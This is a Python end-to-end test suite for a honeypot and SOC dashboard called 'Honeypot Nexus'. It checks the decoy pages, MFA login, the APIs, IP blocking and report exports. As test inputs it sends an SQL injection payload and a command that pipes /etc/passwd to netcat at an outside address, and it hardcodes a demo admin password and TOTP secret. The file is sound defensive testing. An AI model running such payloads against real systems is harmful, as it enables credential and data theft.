#!/usr/bin/env python3
"""
Honeypot Nexus - Live Full Site End-to-End Test Suite
Tests all pages, deception surfaces, authentication, APIs, prevention, and demo simulation.
"""

import sys
import time
import re
import requests
import pyotp

SOC_BASE = "http://127.0.0.1:5000"
HONEYPOT_BASE = "http://127.0.0.1:8080"
DEMO_TOTP_SECRET = "JBSWY3DPEHPK3PXP"
ADMIN_USER = "admin"
ADMIN_PASS = "AdminPassword123!"

results = []

def record(name, passed, details=""):
    status = "PASS" if passed else "FAIL"
    print(f"[{status}] {name} {details}")
    results.append({"name": name, "passed": passed, "details": details})


def extract_csrf_token(html):
    # Try meta tag
    match = re.search(r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    # Try hidden input
    match = re.search(r'<input[^>]+name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    return None


def run_tests():
    print("=" * 70)
    print("  HONEYPOT NEXUS - COMPREHENSIVE LIVE SITE VERIFICATION")
    print("=" * 70)
    print(f"Testing SOC Dashboard at: {SOC_BASE}")
    print(f"Testing Public Honeypot at: {HONEYPOT_BASE}\n")

    # -------------------------------------------------------------
    # 1. Public Honeypot Surface Tests
    # -------------------------------------------------------------
    print("--- 1. Testing Public Corporate Honeypot (SecureCorp) ---")
    session_hp = requests.Session()

    # 1.1 Homepage
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/", timeout=5)
        passed = (r.status_code == 200 and ("SecureCorp" in r.text or "Enterprise" in r.text))
        record("Honeypot Homepage (GET /)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Homepage (GET /)", False, f"Error: {e}")

    # 1.2 Login Page (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/login", timeout=5)
        passed = (r.status_code == 200 and "password" in r.text.lower())
        record("Honeypot Employee Portal (GET /login)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Employee Portal (GET /login)", False, f"Error: {e}")

    # 1.3 Failed Login Attempt (POST)
    try:
        r = session_hp.post(f"{HONEYPOT_BASE}/login", data={"username": "attacker_user", "password": "WrongPassword123!"}, timeout=5)
        passed = (r.status_code == 200 and "invalid" in r.text.lower() and "attacker_user" not in r.text)
        record("Honeypot Credential Trap (POST /login)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Credential Trap (POST /login)", False, f"Error: {e}")

    # 1.4 Fake Admin Console (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/admin", timeout=5, allow_redirects=True)
        passed = (r.status_code == 200 and ("admin" in r.text.lower() or "portal" in r.text.lower()))
        record("Honeypot Admin Console Trap (GET /admin)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Admin Console Trap (GET /admin)", False, f"Error: {e}")

    # 1.5 Synthetic API (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/api/v1/users", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and data.get("status") == "success" and "data" in data)
        record("Honeypot Synthetic API (GET /api/v1/users)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Synthetic API (GET /api/v1/users)", False, f"Error: {e}")

    # 1.6 File Repository (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/files", timeout=5)
        passed = (r.status_code == 200 and ("files" in r.text.lower() or "repository" in r.text.lower()))
        record("Honeypot File Repository Trap (GET /files)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot File Repository Trap (GET /files)", False, f"Error: {e}")

    # 1.7 Database Query UI (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/database", timeout=5)
        passed = (r.status_code == 200 and "query" in r.text.lower())
        record("Honeypot Database Query UI (GET /database)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Database Query UI (GET /database)", False, f"Error: {e}")

    # 1.8 Database SQL Injection Attack (POST)
    try:
        sqli_payload = "' UNION SELECT username, password_hash FROM employees --"
        r = session_hp.post(f"{HONEYPOT_BASE}/database", data={"table": "users", "q": sqli_payload}, timeout=5)
        passed = (r.status_code == 200 and ("root_injected" in r.text or "PWNED" in r.text or "database" in r.text.lower()))
        record("Honeypot SQL Injection Trap (POST /database q=UNION SELECT...)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot SQL Injection Trap (POST /database)", False, f"Error: {e}")

    # 1.9 Web Terminal (GET)
    try:
        r = session_hp.get(f"{HONEYPOT_BASE}/shell", timeout=5)
        passed = (r.status_code == 200 and ("terminal" in r.text.lower() or "shell" in r.text.lower() or "console" in r.text.lower()))
        record("Honeypot Controlled Terminal UI (GET /shell)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Controlled Terminal UI (GET /shell)", False, f"Error: {e}")

    # 1.10 Hostile Command Simulation (POST)
    try:
        r = session_hp.post(f"{HONEYPOT_BASE}/shell/exec", json={"cmd": "cat /etc/passwd | nc 1.2.3.4 4444"}, timeout=5)
        passed = (r.status_code == 200 and "output" in r.json())
        record("Honeypot Command Execution Simulation (POST /shell/exec)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Command Execution Simulation (POST /shell/exec)", False, f"Error: {e}")

    # 1.11 Payload Limit Protection (413)
    try:
        oversized = "A" * (70 * 1024)
        r = session_hp.post(f"{HONEYPOT_BASE}/login", data=oversized, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
        passed = (r.status_code == 413)
        record("Honeypot Payload Limit (413 Payload Too Large)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Honeypot Payload Limit (413 Payload Too Large)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 2. Trusted SOC Authentication & MFA Flow
    # -------------------------------------------------------------
    print("--- 2. Testing SOC Operator Authentication & MFA ---")
    session_soc = requests.Session()

    # 2.1 Login Page
    csrf_token = None
    try:
        r = session_soc.get(f"{SOC_BASE}/auth/login", timeout=5)
        csrf_token = extract_csrf_token(r.text)
        passed = (r.status_code == 200 and ("Operator Login" in r.text or "Honeypot Nexus" in r.text))
        record("SOC Login Page (GET /auth/login)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Login Page (GET /auth/login)", False, f"Error: {e}")

    # 2.2 First Factor Password Submission
    try:
        login_data = {
            "username": ADMIN_USER,
            "password": ADMIN_PASS,
            "csrf_token": csrf_token or ""
        }
        r = session_soc.post(f"{SOC_BASE}/auth/login", data=login_data, allow_redirects=False, timeout=5)
        passed = (r.status_code == 302 and "/auth/mfa" in r.headers.get("Location", ""))
        record("SOC Password Verification (POST /auth/login -> /auth/mfa)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Password Verification (POST /auth/login)", False, f"Error: {e}")

    # 2.3 MFA Verification Page (GET)
    mfa_csrf = None
    try:
        r = session_soc.get(f"{SOC_BASE}/auth/mfa", timeout=5)
        mfa_csrf = extract_csrf_token(r.text)
        passed = (r.status_code == 200 and "Two-Factor" in r.text)
        record("SOC MFA Page (GET /auth/mfa)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC MFA Page (GET /auth/mfa)", False, f"Error: {e}")

    # 2.4 MFA TOTP Code Submission (POST)
    soc_auth_csrf = None
    try:
        totp = pyotp.TOTP(DEMO_TOTP_SECRET)
        code = totp.now()
        mfa_data = {
            "code": code,
            "csrf_token": mfa_csrf or ""
        }
        r = session_soc.post(f"{SOC_BASE}/auth/mfa", data=mfa_data, allow_redirects=True, timeout=5)
        soc_auth_csrf = extract_csrf_token(r.text)
        passed = (r.status_code == 200 and "Honeypot Nexus" in r.text and ("SOC" in r.text or "Dashboard" in r.text))
        record("SOC MFA Code Verification & Session Issuance", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC MFA Code Verification & Session Issuance", False, f"Error: {e}")

    # 2.5 Live WebSocket Stream Authentication Check (/soc)
    try:
        import socketio as sio_module
        cookie_header = "; ".join([f"{k}={v}" for k, v in session_soc.cookies.items()])
        sio_auth = sio_module.Client()
        auth_connected = False
        try:
            sio_auth.connect(f"{SOC_BASE}", namespaces=["/soc"], headers={"Cookie": cookie_header}, wait_timeout=3)
            time.sleep(0.5)
            auth_connected = "/soc" in sio_auth.namespaces
            sio_auth.disconnect()
        except Exception:
            auth_connected = False

        record("SOC Live WebSocket Telemetry Subscription (/soc)", auth_connected, "(Authenticated live stream)")
    except Exception as e:
        record("SOC Live WebSocket Telemetry Subscription (/soc)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 3. SOC Management Dashboard UI Pages
    # -------------------------------------------------------------
    print("--- 3. Testing SOC Dashboard UI Interfaces ---")

    # 3.1 Overview
    try:
        r = session_soc.get(f"{SOC_BASE}/dashboard/", timeout=5)
        passed = (r.status_code == 200 and ("Threat Pulse" in r.text or "Dashboard" in r.text))
        record("SOC Overview Interface (GET /dashboard/)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Overview Interface (GET /dashboard/)", False, f"Error: {e}")

    # 3.2 Geographic Attack Map
    try:
        r = session_soc.get(f"{SOC_BASE}/dashboard/map", timeout=5)
        passed = (r.status_code == 200 and "fullAttackMap" in r.text and "GeoIP Source" in r.text)
        record("SOC Geographic Attack Map (GET /dashboard/map)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Geographic Attack Map (GET /dashboard/map)", False, f"Error: {e}")

    # 3.3 Attacker Dossiers
    try:
        r = session_soc.get(f"{SOC_BASE}/dashboard/attackers", timeout=5)
        passed = (r.status_code == 200 and "Attacker Threat Profiles" in r.text)
        record("SOC Attacker Profiles Table (GET /dashboard/attackers)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Attacker Profiles Table (GET /dashboard/attackers)", False, f"Error: {e}")

    # 3.4 Attack Prevention Layer UI
    try:
        r = session_soc.get(f"{SOC_BASE}/dashboard/prevention", timeout=5)
        passed = (r.status_code == 200 and "Application-Level Attack Prevention" in r.text)
        record("SOC Prevention Center (GET /dashboard/prevention)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("SOC Prevention Center (GET /dashboard/prevention)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 4. SOC REST APIs & Telemetry Endpoints
    # -------------------------------------------------------------
    print("--- 4. Testing SOC REST APIs ---")

    # 4.1 Dashboard Summary API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/dashboard/summary", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "kpis" in data and "threat" in data)
        record("REST API: Dashboard Summary (GET /api/dashboard/summary)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Dashboard Summary (GET /api/dashboard/summary)", False, f"Error: {e}")

    # 4.2 Attacker Profiles API (Verify is_simulated and geo_source)
    try:
        r = session_soc.get(f"{SOC_BASE}/api/attackers", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "data" in data)
        has_sim_fields = any("is_simulated" in p for p in data.get("data", [])) if data.get("data") else True
        record("REST API: Attacker Profiles & GeoIP Status (GET /api/attackers)", passed and has_sim_fields, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Attacker Profiles (GET /api/attackers)", False, f"Error: {e}")

    # 4.3 Map Points API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/map/points", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "points" in data and "stats" in data and "geoip_provider" in data.get("stats", {}))
        record("REST API: Live Map Telemetry Points (GET /api/map/points)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Live Map Telemetry Points (GET /api/map/points)", False, f"Error: {e}")

    # 4.4 System Health API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/system/health", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "cpu" in data and "database" in data)
        record("REST API: System Health & Pipeline (GET /api/system/health)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: System Health & Pipeline (GET /api/system/health)", False, f"Error: {e}")

    # 4.5 Honeypot Status API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/honeypot/status", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and len(data.get("surfaces", [])) == 6)
        record("REST API: Honeypot Deception Surfaces (GET /api/honeypot/status)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Honeypot Deception Surfaces (GET /api/honeypot/status)", False, f"Error: {e}")

    # 4.6 Prevention Overview API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/prevention/overview", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "stats" in data and "config" in data)
        record("REST API: Prevention Overview & KPIs (GET /api/prevention/overview)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Prevention Overview & KPIs (GET /api/prevention/overview)", False, f"Error: {e}")

    # 4.7 Prevention Blocks History API
    try:
        r = session_soc.get(f"{SOC_BASE}/api/prevention/blocks?page=1&per_page=10", timeout=5)
        data = r.json()
        passed = (r.status_code == 200 and "items" in data)
        record("REST API: Prevention Blocks History (GET /api/prevention/blocks)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("REST API: Prevention Blocks History (GET /api/prevention/blocks)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 5. Prevention Layer Blocking & Verification
    # -------------------------------------------------------------
    print("--- 5. Testing Attack Prevention Enforcement ---")
    test_block_ip = "198.51.100.222"
    headers_api = {}
    if soc_auth_csrf:
        headers_api["X-CSRFToken"] = soc_auth_csrf

    # 5.1 Manual Block of Test IP
    try:
        block_payload = {
            "ip": test_block_ip,
            "duration_minutes": 20,
            "reason": "Automated verification test block"
        }
        r = session_soc.post(f"{SOC_BASE}/api/prevention/block", json=block_payload, headers=headers_api, timeout=5)
        passed = (r.status_code == 200 and r.json().get("status") == "success")
        record("Prevention API: Manual IP Block (POST /api/prevention/block)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Prevention API: Manual IP Block (POST /api/prevention/block)", False, f"Error: {e}")

    # 5.2 Whitelist / Loopback Block Protection (Must return 400)
    try:
        r = session_soc.post(f"{SOC_BASE}/api/prevention/block", json={"ip": "127.0.0.1", "duration_minutes": 30, "reason": "Test"}, headers=headers_api, timeout=5)
        passed = (r.status_code == 400)
        record("Prevention Whitelist Guard (Block 127.0.0.1 -> 400 Conflict)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Prevention Whitelist Guard (Block 127.0.0.1 -> 400 Conflict)", False, f"Error: {e}")

    # 5.3 Input Validation on Duration (> 10080 mins must return 422)
    try:
        r = session_soc.post(f"{SOC_BASE}/api/prevention/block", json={"ip": "198.51.100.123", "duration_minutes": 50000, "reason": "Test"}, headers=headers_api, timeout=5)
        passed = (r.status_code == 422)
        record("Prevention Input Validation Guard (Duration > 7 Days -> 422)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Prevention Input Validation Guard (Duration > 7 Days -> 422)", False, f"Error: {e}")

    # 5.4 Manual Unblock of Test IP
    try:
        unblock_payload = {
            "ip": test_block_ip,
            "reason": "Test block completed"
        }
        r = session_soc.post(f"{SOC_BASE}/api/prevention/unblock", json=unblock_payload, headers=headers_api, timeout=5)
        passed = (r.status_code == 200 and r.json().get("status") == "success")
        record("Prevention API: Manual IP Unblock (POST /api/prevention/unblock)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Prevention API: Manual IP Unblock (POST /api/prevention/unblock)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 6. Reporting & Export Subsystem
    # -------------------------------------------------------------
    print("--- 6. Testing Reporting & Data Export Subsystems ---")

    # 6.1 CSV Events Export
    try:
        r = session_soc.get(f"{SOC_BASE}/api/reports/events.csv", timeout=5)
        passed = (r.status_code == 200 and "text/csv" in r.headers.get("Content-Type", "") and "event_id" in r.text)
        record("Report Export: Events CSV (/api/reports/events.csv)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Report Export: Events CSV (/api/reports/events.csv)", False, f"Error: {e}")

    # 6.2 CSV Attackers Export
    try:
        r = session_soc.get(f"{SOC_BASE}/api/reports/attackers.csv", timeout=5)
        passed = (r.status_code == 200 and "text/csv" in r.headers.get("Content-Type", "") and "source_ip" in r.text)
        record("Report Export: Attackers CSV (/api/reports/attackers.csv)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Report Export: Attackers CSV (/api/reports/attackers.csv)", False, f"Error: {e}")

    # 6.3 PDF Threat Report Export
    try:
        r = session_soc.get(f"{SOC_BASE}/api/reports/threat-report.pdf", timeout=10)
        passed = (r.status_code == 200 and "application/pdf" in r.headers.get("Content-Type", "") and r.content.startswith(b"%PDF"))
        record("Report Export: Executive Threat Report PDF (/api/reports/threat-report.pdf)", passed, f"(HTTP {r.status_code})")
    except Exception as e:
        record("Report Export: Executive Threat Report PDF (/api/reports/threat-report.pdf)", False, f"Error: {e}")

    print()

    # -------------------------------------------------------------
    # 7. Demo Attack Telemetry Simulation
    # -------------------------------------------------------------
    print("--- 7. Testing Live Attack Simulation & Pipeline Processing ---")
    try:
        r = session_soc.post(f"{SOC_BASE}/api/demo/run", json={"scenario": "mixed"}, headers=headers_api, timeout=5)
        passed = (r.status_code == 200 and r.json().get("status") == "success")
        events_planned = r.json().get("events_planned", 0)
        record("Demo Attack Engine (POST /api/demo/run scenario=mixed)", passed, f"(Planned {events_planned} events)")

        if passed:
            print("  [*] Waiting 2.5s for asynchronous EventBus worker to ingest and correlate telemetry...")
            time.sleep(2.5)

            r_sum = session_soc.get(f"{SOC_BASE}/api/dashboard/summary", timeout=5)
            kpis = r_sum.json().get("kpis", {})
            total_events = kpis.get("total_events", 0)
            record("Live Telemetry Persistence Verification", total_events > 0, f"(Current Database Events: {total_events})")
    except Exception as e:
        record("Demo Attack Engine (POST /api/demo/run)", False, f"Error: {e}")

    print()
    print("=" * 70)
    passed_count = sum(1 for r in results if r["passed"])
    total_count = len(results)
    print(f"  TOTAL TESTS RUN: {total_count} | PASSED: {passed_count} | FAILED: {total_count - passed_count}")
    print("=" * 70)

    if passed_count == total_count:
        print("[SUCCESS] All endpoints, interfaces, security rules, and APIs verified operational!")
        return 0
    else:
        print("[WARNING] Some checks failed. Review output above.")
        return 1


if __name__ == "__main__":
    sys.exit(run_tests())
